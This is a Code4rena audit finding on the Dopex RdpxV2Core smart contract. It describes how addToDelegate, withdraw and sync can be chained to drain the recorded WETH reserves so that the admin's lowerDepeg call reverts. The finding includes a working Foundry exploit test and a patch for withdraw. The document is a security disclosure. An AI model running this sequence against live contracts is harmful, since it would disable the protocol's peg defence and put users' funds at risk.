[H-08] The peg stability module can be compromised by forcing lowerDepeg to revert
Submitted by0xrafaelnicolau, also found byHHK,koo,_eperezok,ubermensch,nobody2018,bart1e,peakbolt,0xnev,ElCid,HChang26,Vagner,max10afternoon,volodya,yashar,degensec,Krace,minhtrng,KrisApostolov,dimulski,0xc0ffEE,pontifex,Toshii,0xkazim,dethera,0xMosh,halden,mussucal,ether_sky,wintermute,bin2chen,QiuhaoLi,0xvj,Aymen0909,glcanvas,RED-LOTUS-REACH,gizzy,MiniGlome,Talfao,carrotsmuggler,ladboy233,Baki,hals,chainsnake,asui,Viktor_Cortess,Inspex,qbs,lanrebayode77,zaevlad,tapir,ABAIKUNANBAEV,dirk_y,gumgumzum,zzebra83, ravikiranweb3 (1,2),rvierdiiev,Nyx,kodyvim,Jorgect,Kow,deadrxsezzz,0xWaitress,0x111,atrixs6,said,LFGSecurity,0xCiphky,grearlake,Yanchuan, andchaduke
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110
In a scenario where extreme market conditions necessitate the execution of thelowerDepegfunction to restore the dpxETH/ETH peg, an attacker can exploit the flawed interaction between theaddToDelegate,withdraw, andsyncfunctions to force a revert on the admin’s attempt to restore the peg. As a result, the protocol will not be able to effectively defend the peg, leading to potential disruptions in the protocol’s peg stability module.
Proof of Concept
If 1 dpxETH < 1 ETH, therpdxV2Corecontract admin will call thelowerDepegfunction to restore the peg. The backing reserves are used to buy and burn dpxETH from the curve pool to bring back the peg to 1 ETH. An attacker can execute a transaction to manipulate the WETH reserves and cause the admin transaction to revert.
The attacker initiates the exploit by calling theaddToDelegatefunction, and depositing WETH intorpdxV2Corecontract. By doing so, the attacker effectively updates thetotalWethDelegatedstate variable, increasing it by the deposited amount.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964
The attacker subsequently calls thewithdrawfunction, which does not update thetotalWethDelegatedstate variable. Consequently, thetotalWethDelegatedvariable retains the inflated value of WETH delegated, even though the WETH has neither been delegated nor it remains available, since it was withdrawn.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990
Finally, the attacker calls thesyncfunction which inaccurately updates the WETH reserves by subtracting the inflatedtotalWethDelegatedvalue. This manipulation artificially reduces the WETH reserves in the contract to a really small value or even zero.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002
TherpdxV2Coreadmin calls thelowerDepegfunction to restore the dpxETH/ETH peg, which ultimately will revert due to an underflow error.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110
Note that the attacker can loop through the process outlined in steps 1. and 2., thereby increasing thetotalWethDelegatedthrough a small input amount, before executing the sync function. As a result, this attack becomes financially inexpensive to execute.
// SPDX-License-Identifier: MITpragmasolidity0.8.19;import{Setup}from"./Setup.t.sol";import"../../lib/forge-std/src/console.sol";import"../../lib/forge-std/src/StdError.sol";contractExploitisSetup{functiontestExploitWETHReserves()external{// note: setupaddressuser1=address(0x1001);addressuser2=address(0x1002);weth.mint(address(user1),10ether);weth.mint(address(user2),10ether);rdpx.mint(address(user1),1000000ether);// user1 bondsvm.startPrank(user1);rdpx.approve(address(rdpxV2Core),type(uint256).max);weth.approve(address(rdpxV2Core),type(uint256).max);rdpxV2Core.bond(10ether,0,address(this));vm.stopPrank();// note: weth reserves manipulation// gets the reserve of WETH in the core contractvm.startPrank(user2);(,uint256wethReserveBefore,) =rdpxV2Core.getReserveTokenInfo("WETH");console.log("WETH reserve before: ",wethReserveBefore);// approve rpdxV2Core to spend WETHweth.approve(address(rdpxV2Core),type(uint256).max);// delegate WETH, and assert it was delegateduint256delegateId=rdpxV2Core.addToDelegate(wethReserveBefore,1e8);assertTrue(rdpxV2Core.totalWethDelegated() ==wethReserveBefore);// withdraw WETH, assert WETH was withdrawn but it still says WETH is delegatedrdpxV2Core.withdraw(delegateId);assertTrue(rdpxV2Core.totalWethDelegated() ==wethReserveBefore);// assert that the user2 has the same balance he had beforeassertTrue(weth.balanceOf(user2) ==10ether);// call sync and make WETH reserves -= WETH delegatedrdpxV2Core.sync();// check the amount of WETH in reserves after and assert it is smaller than before(,uint256wethReserveAfter,) =rdpxV2Core.getReserveTokenInfo("WETH");assertTrue(wethReserveBefore-rdpxV2Core.totalWethDelegated() ==wethReserveAfter);console.log("WETH reserve after:  ",wethReserveAfter);vm.stopPrank();// note: admin tries to defend the peg.// update the dpxETH price to simulate 1 dpxETH < 1 ETHdpxEthPriceOracle.updateDpxEthPrice(98137847);// expect the transaction to revert with an underflow.vm.expectRevert(stdError.arithmeticError);rdpxV2Core.lowerDepeg(0,10ether,0,0);}
Tools Used
Foundry
Recommended Mitigation Steps
Update the totalWethDelegated in thewithdrawfunction.
functionwithdraw(uint256delegateId)externalreturns(uint256amountWithdrawn) {_whenNotPaused();_validate(delegateId<delegates.length,14);Delegatestoragedelegate=delegates[delegateId];_validate(delegate.owner==msg.sender,9);amountWithdrawn=delegate.amount-delegate.activeCollateral;_validate(amountWithdrawn>0,15);delegate.amount=delegate.activeCollateral;+totalWethDelegated-=amountWithdrawn;IERC20WithBurn(weth).safeTransfer(msg.sender,amountWithdrawn);emitLogDelegateWithdraw(delegateId,amountWithdrawn);}
Alex the Entreprenerd (Judge) commented:
Best + explains why it’s high.
psytama (Dopex) confirmed via duplicate issue 2186